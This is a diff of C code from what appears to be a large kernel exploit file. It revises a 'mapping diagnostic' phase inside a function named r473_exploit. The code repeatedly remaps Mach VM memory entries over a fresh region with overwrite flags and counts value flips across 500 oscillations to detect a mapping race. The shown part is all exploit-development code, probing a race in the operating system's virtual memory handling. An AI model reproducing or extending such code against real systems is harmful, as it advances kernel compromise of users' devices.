@@ -17776,59 +17776,80 @@ static void r473_exploit(void) {
     rlog("\n  --- Phase 3.5: Mapping diagnostic ---\n");
     fflush(stdout);
     {
-        mach_vm_address_t taddr = search_base;
-        /* Test 1: map large surface (should work) */
-        mach_vm_address_t t1 = taddr;
-        kern_return_t kr1 = mach_vm_map(mach_task_self(), &t1, R473_LARGE_SZ, 0,
+        /* Check data from Phase 3 mapping */
+        uint8_t v0 = *(volatile uint8_t *)search_base;
+        rlog("    phase3 data at search_base: 0x%02x (expect 0xAA)\n", v0);
+
+        /* Test A: use fresh anonymous region, then map large surface over it */
+        mach_vm_address_t fresh = 0;
+        mach_vm_allocate(mach_task_self(), &fresh, R473_LARGE_SZ, VM_FLAGS_ANYWHERE);
+        rlog("    fresh anon at 0x%llx\n", (unsigned long long)fresh);
+
+        /* Overwrite approach */
+        mach_vm_address_t ta = fresh;
+        kern_return_t kra = mach_vm_map(mach_task_self(), &ta, R473_LARGE_SZ, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
             large_entry, 0, FALSE,
             VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
             VM_INHERIT_NONE);
-        uint8_t v1 = *(volatile uint8_t *)taddr;
-        rlog("    large map kr=0x%x val=0x%02x (expect 0xAA)\n", kr1, v1);
+        uint8_t va = (kra == 0) ? *(volatile uint8_t *)fresh : 0xFF;
+        rlog("    A: overwrite anon w/large: kr=0x%x val=0x%02x\n", kra, va);
 
-        /* Test 2: map small surface at 16K (overwrite first page) */
-        mach_vm_address_t t2 = taddr;
-        kern_return_t kr2 = mach_vm_map(mach_task_self(), &t2, R473_SMALL_SZ, 0,
+        /* Deallocate + remap approach */
+        mach_vm_deallocate(mach_task_self(), fresh, R473_LARGE_SZ);
+        ta = fresh;
+        kern_return_t krb = mach_vm_map(mach_task_self(), &ta, R473_LARGE_SZ, 0,
+            VM_FLAGS_FIXED,
+            large_entry, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
+            VM_INHERIT_NONE);
+        uint8_t vb = (krb == 0) ? *(volatile uint8_t *)fresh : 0xFF;
+        rlog("    B: dealloc+map large: kr=0x%x val=0x%02x\n", krb, vb);
+
+        /* Now overwrite first page with small surface */
+        ta = fresh;
+        kern_return_t krc = mach_vm_map(mach_task_self(), &ta, R473_SMALL_SZ, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
             small_entry, 0, FALSE,
             VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
             VM_INHERIT_NONE);
-        uint8_t v2a = *(volatile uint8_t *)taddr;
-        uint8_t v2b = *(volatile uint8_t *)(taddr + R473_SMALL_SZ);
-        rlog("    small map kr=0x%x first=0x%02x (expect 0xBB) second=0x%02x (expect 0xAA)\n",
-             kr2, v2a, v2b);
+        uint8_t vc1 = (krc == 0) ? *(volatile uint8_t *)fresh : 0xFF;
+        uint8_t vc2 = *(volatile uint8_t *)(fresh + R473_SMALL_SZ);
+        rlog("    C: overwrite w/small: kr=0x%x first=0x%02x second=0x%02x\n", krc, vc1, vc2);
 
-        /* Test 3: restore large surface */
-        mach_vm_address_t t3 = taddr;
-        kern_return_t kr3 = mach_vm_map(mach_task_self(), &t3, R473_LARGE_SZ, 0,
+        /* Restore large */
+        ta = fresh;
+        kern_return_t krd = mach_vm_map(mach_task_self(), &ta, R473_LARGE_SZ, 0,
             VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
             large_entry, 0, FALSE,
             VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
             VM_INHERIT_NONE);
-        uint8_t v3 = *(volatile uint8_t *)taddr;
-        rlog("    restore kr=0x%x val=0x%02x (expect 0xAA)\n", kr3, v3);
+        uint8_t vd = (krd == 0) ? *(volatile uint8_t *)fresh : 0xFF;
+        rlog("    D: restore large: kr=0x%x val=0x%02x\n", krd, vd);
 
-        /* Test 4: quick race test (500 oscillations, check data) */
-        int saw_bb = 0, saw_aa = 0;
+        /* Quick race test on the fresh region */
+        int saw_bb = 0, saw_aa = 0, osc_ok = 0, osc_fail = 0;
         for (int q = 0; q < 500; q++) {
-            mach_vm_address_t ta = taddr;
-            mach_vm_map(mach_task_self(), &ta, R473_SMALL_SZ, 0,
+            ta = fresh;
+            kern_return_t k1 = mach_vm_map(mach_task_self(), &ta, R473_SMALL_SZ, 0,
                 VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                 small_entry, 0, FALSE,
                 VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
                 VM_INHERIT_NONE);
-            ta = taddr;
+            if (k1 == 0) osc_ok++; else osc_fail++;
+            ta = fresh;
             mach_vm_map(mach_task_self(), &ta, R473_LARGE_SZ, 0,
                 VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                 large_entry, 0, FALSE,
                 VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE,
                 VM_INHERIT_NONE);
-            uint8_t vq = *(volatile uint8_t *)taddr;
+            uint8_t vq = *(volatile uint8_t *)fresh;
             if (vq == 0xBB) saw_bb++;
             else if (vq == 0xAA) saw_aa++;
         }
-        rlog("    quick osc: aa=%d bb=%d (both nonzero = race visible)\n", saw_aa, saw_bb);
+        rlog("    E: osc aa=%d bb=%d ok=%d fail=%d\n", saw_aa, saw_bb, osc_ok, osc_fail);
+
+        mach_vm_deallocate(mach_task_self(), fresh, R473_LARGE_SZ);
         fflush(stdout);
     }
 
